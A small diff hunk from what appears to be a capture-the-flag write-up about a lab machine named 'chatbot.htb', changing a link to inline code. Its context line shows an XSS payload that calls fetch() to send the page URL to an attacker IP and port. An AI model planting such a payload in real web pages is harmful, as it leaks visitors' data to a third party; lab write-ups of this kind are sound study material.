@@ -69,7 +69,7 @@ fetch("http://10.10.14.48:8080/?d=" + encodeURIComponent(window.location.href));
 
 ![image7](../resources/5390cc96eb224ca586654dba6e950044.png)
 
-This gives us the domain <http://chatbot.htb/admin/admin.html>
+This gives us the domain  `http://chatbot.htb/admin/admin.html`
 
 **<u>XSS Websocket - Exploit</u>**
 
